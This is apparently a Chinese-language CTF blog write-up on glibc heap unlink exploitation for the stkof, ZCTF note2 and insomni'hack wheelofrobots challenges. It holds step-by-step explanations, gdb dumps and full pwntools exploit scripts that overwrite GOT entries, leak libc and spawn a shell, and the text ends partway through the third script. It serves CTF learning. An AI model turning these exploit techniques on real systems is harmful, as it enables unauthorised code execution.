<p><a href="https://paper.seebug.org/450/" target="_blank" rel="noopener">知道创宇讲解的一道题目</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/" target="_blank" rel="noopener">ctf-wiki讲解这部分知识</a></p>
<ol>
<li>首先先申请一块内存，冲掉printf和fgets所需缓冲区</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">ptr = <span class="number">0x0000000000602140</span>+<span class="number">0x10</span></span><br><span class="line">alloc(<span class="number">0x100</span>) <span class="comment">#idx1</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>是unlink部分，当然用unlink方法来解了，第一节学过了，伪造一个chunk，然后通过溢出覆盖第二个堆块的pre_size和size，在free第二个堆块的时候就会unlink我们的伪造的p堆块</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x30</span>) <span class="comment">#idx2</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx3</span></span><br><span class="line">alloc(<span class="number">0x30</span>) <span class="comment">#idx4</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>, <span class="string">'a'</span>)</span><br><span class="line">payload += p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">fill(<span class="number">2</span>, payload)</span><br><span class="line">delete(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/20gx 0x20f7560-0x30</span><br><span class="line">0x20f7530:	0x0000000000000000	0x0000000000000041 <span class="comment">#chunk2</span></span><br><span class="line">0x20f7540:	0x0000000000000000	0x0000000000000030 <span class="comment">#p</span></span><br><span class="line">0x20f7550:	0x0000000000602138	0x0000000000602140</span><br><span class="line">0x20f7560:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x20f7570:	0x0000000000000030	0x0000000000000090 <span class="comment">#chunk3</span></span><br><span class="line">0x20f7580:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f7590:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f75a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f75b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f75c0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>这里已经溢出覆盖掉chunk3的size了<br>其实unlink已经说过一次了，</p>
<ul>
<li>首先，第一步要过掉unlink的size检测，覆盖chunk3的pre_size为fake_chunk大小</li>
<li>其次chunk3的insue位要为0，标志前面一个堆块未在使用当中</li>
<li>然后关键点就是伪造fd跟bk了</li>
<li>在第一点中我将ptr设置为global+0x10意思就是第二块堆块地址，这就是存放p的地方 </li>
<li>unlink第一步 FD = p-&gt;fd = ptr-0x18</li>
<li>unlink第二步 BK=p-&gt;bk = ptr-0x10</li>
<li>unlink第三步 判断FD-&gt;bk == p &amp;&amp; BK-&gt;fd == p ?</li>
<li>过了检验后</li>
<li>FD-&gt;bk = * (ptr-0x18 + 0x18 )= BK = ptr -0x10</li>
<li>BK-&gt;fd = * (ptr-0x10+0x10) = FD = ptr-0x18<br>最终结果就是*ptr = ptr-0x18，而ptr是0x0000000000602150故最终就是将global+0x10处的值改为0x602138<br>然后我们在编辑第二块的时候实际上就是编辑0x602138处，也就是global-0x8处</li>
</ul>
<ol start="3">
<li>泄露地址</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(free_got)+p64(puts_got) + <span class="string">'a'</span>*<span class="number">8</span> + p64(atoi_got) <span class="comment">#这里对应的是第一块堆块，第二块，第三块和第四块</span></span><br><span class="line">fill(<span class="number">2</span>, payload) </span><br><span class="line">fill(<span class="number">1</span>,p64(puts_plt))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">'FAIL\n'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'FAIL\n'</span>)</span><br><span class="line">puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">io.success(<span class="string">"system_addr: 0x%x"</span> % system_addr)</span><br></pre></td></tr></table></figure>
<p>没什么好说的啊，覆写got表为put泄露地址</p>
<ol start="4">
<li>最后我修改atoi为system，因为输入的会经过atoi转换，所以输入的就是system参数</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gdb.attach(io)</span><br><span class="line">fill(<span class="number">4</span>, p64(system_addr))</span><br><span class="line">io.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br></pre></td></tr></table></figure>




<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'stkof'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'stkof'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">"OK\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printf</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.sendline(str(len(content)))</span><br><span class="line">    io.sendline(content)</span><br><span class="line">    io.recvuntil(<span class="string">"OK\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">    puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">    ptr = <span class="number">0x0000000000602140</span>+<span class="number">0x10</span></span><br><span class="line">    <span class="comment">#for buffer</span></span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0x100</span>) <span class="comment">#idx1   </span></span><br><span class="line">    alloc(<span class="number">0x30</span>) <span class="comment">#idx2</span></span><br><span class="line">    alloc(<span class="number">0x80</span>) <span class="comment">#idx3</span></span><br><span class="line">    alloc(<span class="number">0x30</span>) <span class="comment">#idx4</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x30</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload += p64(<span class="number">0x30</span>)</span><br><span class="line">    payload += p64(<span class="number">0x90</span>)</span><br><span class="line">    fill(<span class="number">2</span>, payload)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">    payload += p64(free_got)+p64(puts_got) + <span class="string">'a'</span>*<span class="number">8</span> + p64(atoi_got)</span><br><span class="line">    fill(<span class="number">2</span>, payload) </span><br><span class="line">    fill(<span class="number">1</span>,p64(puts_plt))</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'FAIL\n'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'FAIL\n'</span>)</span><br><span class="line">    puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh_addr = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    io.success(<span class="string">"system_addr: 0x%x"</span> % system_addr)</span><br><span class="line">    </span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    fill(<span class="number">4</span>, p64(system_addr))</span><br><span class="line">    io.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="2016-ZCTF-note2"><a href="#2016-ZCTF-note2" class="headerlink" title="2016 ZCTF note2"></a>2016 ZCTF note2</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/" target="_blank" rel="noopener">ctf-wiki讲解</a></p>
<p>我只讲差异，里面有的我就不讲了，我只发现了这个漏洞点<br>程序在每次编辑 note 时，都会申请 0xa0 大小的内存，但是在 free 之后并没有设置为 NULL。<br>然后我并不会利用这个，本来想利用chunk extends上一节学的，发觉他free后的大小不怎么对，到时看下源码吧，他free后的chunk大小不是合并后的大小，最后看到了大佬讲解的那个0，然后通过-1转成无符号整数，这个我自己查看的时候看不出</p>
<h3 id="漏洞利用过程-1"><a href="#漏洞利用过程-1" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>第一步构造unlink，原理上一节弄过了，所以感觉这次顺畅好多</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ptr = <span class="number">0x0000000000602120</span> </span><br><span class="line">first()</span><br><span class="line"><span class="comment"># unlink</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0xa0</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>) </span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>, <span class="string">'a'</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>, payload)</span><br><span class="line">newnote(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x8</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>, <span class="string">'c'</span>*<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">newnote(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x10</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x90</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>unlink过后修改ptr[0]指针，指向atoi的got表，泄露地址，为什么指向atoi?为后面做准备</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(elf.got[<span class="string">'atoi'</span>])</span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, payload) </span><br><span class="line">shownote(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">"TheNewContents:Edit note success!\n"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Content is "</span>)</span><br><span class="line">atoi_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"atoi_addr: 0x%x"</span> % atoi_addr)</span><br><span class="line">libc_base = atoi_addr - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br></pre></td></tr></table></figure>

<p>getshell,因为此时第一块堆块还指向atoi的got表，所以此时编辑下，就可以覆写got表了，输入的时候会将输入串atoi，所以就成为参数了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#get_shell</span></span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, p64(system_addr))</span><br><span class="line">io.sendline(<span class="string">"/bin/sh"</span>)</span><br></pre></td></tr></table></figure>



<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'note2'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'note2'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newnote</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editnote</span><span class="params">(idx, choice, content)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shownote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">first</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Input your name:\n"</span>, <span class="string">"greenhand"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input your address:\n"</span>, <span class="string">"greenhand"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    ptr = <span class="number">0x0000000000602120</span> </span><br><span class="line">    first()</span><br><span class="line">    <span class="comment"># unlink</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0xa0</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>) </span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>, <span class="string">'a'</span>)</span><br><span class="line">    newnote(<span class="number">0x80</span>, payload)</span><br><span class="line">    newnote(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x8</span>)</span><br><span class="line">    newnote(<span class="number">0x80</span>, <span class="string">'c'</span>*<span class="number">0x20</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    newnote(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x10</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x90</span>))</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(elf.got[<span class="string">'atoi'</span>])</span><br><span class="line">    editnote(<span class="number">0</span>, <span class="number">1</span>, payload) </span><br><span class="line">    shownote(<span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"TheNewContents:Edit note success!\n"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"Content is "</span>)</span><br><span class="line">    atoi_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"atoi_addr: 0x%x"</span> % atoi_addr)</span><br><span class="line">    libc_base = atoi_addr - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#get_shell</span></span><br><span class="line">    editnote(<span class="number">0</span>, <span class="number">1</span>, p64(system_addr))</span><br><span class="line">    io.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>


<h2 id="2017-insomni’hack-wheelofrobots"><a href="#2017-insomni’hack-wheelofrobots" class="headerlink" title="2017 insomni’hack wheelofrobots"></a>2017 insomni’hack wheelofrobots</h2><p>这道题难点我觉得在于代码长了点，然后漏洞点难找了点，其余还好，我自己分析的时候又是一头雾水，只看出free的时候没置空，然后还有的是在change部分，他代销有的居然达到了0x9C40uLL，这里我觉得也是一个点，off-by-one真没看出来</p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/" target="_blank" rel="noopener">ctf-wiki讲解</a></p>
<p>我不在分析功能以及漏洞点分析，这次我自己没分析出来，只讲下漏洞利用过程以及过程中踩到的坑</p>
<h3 id="漏洞利用过程-2"><a href="#漏洞利用过程-2" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><ol>
<li>准备部分</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size=<span class="number">0</span>)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">2</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Bender's intelligence: "</span>, str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">3</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Robot Devil's cruelty: "</span>, str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">6</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Destructor's powerful: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx, name)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line">    io.sendafter(<span class="string">"Robot's name: "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_robot</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">off_by_one</span><span class="params">(byte)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"9999"</span> + byte)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr1, addr2)</span>:</span></span><br><span class="line">    change(<span class="number">1</span>, p64(addr1))</span><br><span class="line">    change(<span class="number">6</span>, p64(addr2))</span><br></pre></td></tr></table></figure>

<p><strong>注意：这里change是sendafter不是sendline，因为sendline会发送多一个\n破坏地址</strong></p>
<ol start="2">
<li>off-by-one溢出修改部分</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">off_by_one(<span class="string">'\x01'</span>)</span><br><span class="line"><span class="comment"># change fd pointer</span></span><br><span class="line">change(<span class="number">2</span>, p64(<span class="number">0x0000000000603138</span>))</span><br><span class="line">off_by_one(<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pass the fastbin check size=0x20</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line"><span class="comment">#now idx2-&gt;0x603138-&gt;null</span></span><br><span class="line"><span class="comment">#get malloc to -&gt; 0x603138</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line"><span class="comment">#now 0x603138-&gt;null</span></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#whell &lt;=2</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>我觉得这部分应该是顺风顺水的吧，off-by-one学过了</p>
<ol start="3">
<li>关键点</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#now only have idx1 pointer-&gt;0x603138 , it's destructor_size</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#the size must bigger than remove(2) remove(3)'s  size</span></span><br><span class="line">add(<span class="number">6</span>, <span class="number">4</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">7</span>)</span><br><span class="line"><span class="comment">#change idx6 size:1000</span></span><br><span class="line">change(<span class="number">1</span>, p64(<span class="number">1000</span>))</span><br><span class="line">ptr = <span class="number">0x00000000006030E8</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x50</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">'a'</span>)</span><br><span class="line">payload += p64(<span class="number">0x50</span>) <span class="comment">#pre_size</span></span><br><span class="line">payload += p64(<span class="number">0xa0</span>) <span class="comment">#size</span></span><br><span class="line">change(<span class="number">6</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink</span></span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>这里的话，要注意的就是开头申请的两个add了，那个不能低于remove的大小，不然会重新覆盖到那上边去，至于大小是多少，自己构造就好，然后溢出覆盖unlink，常见了</p>
<ol start="4">
<li>修改并泄露地址</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">'a'</span>*<span class="number">0x18</span> + p64(ptr)</span><br><span class="line">change(<span class="number">6</span>, payload)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">write(elf.got[<span class="string">'exit'</span>], <span class="number">0x0000000000401855</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># change robot_wheel to 3</span></span><br><span class="line">write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line">change(<span class="number">1</span>, p64(elf.got[<span class="string">'puts'</span>]))</span><br><span class="line">start_robot()</span><br><span class="line"><span class="comment"># leak </span></span><br><span class="line">io.recvuntil(<span class="string">" Thx "</span>)</span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br></pre></td></tr></table></figure>
<p>我觉得这部分跟unlink属于同一部分的，重新修改地址，这里是将tinny改成指向destructor的位置处，这样编辑1就可以编辑第6处指针，在编辑第六处就是写入了，相当于任意写<br>写入完后泄露</p>
<ol start="5">
<li>getshell了</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#get shell</span></span><br><span class="line">write(elf.got[<span class="string">'atoi'</span>], system_addr)</span><br><span class="line">io.send(<span class="string">"sh;#"</span>)</span><br></pre></td></tr></table></figure>

<p>跟前面套路一样，改掉atoi，然后传入sh就完了，ctf-wiki的改的free</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'wheelofrobots'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'wheelofrobots'</span></span><br><span class="line">ctx.binary = exe</span><br><span 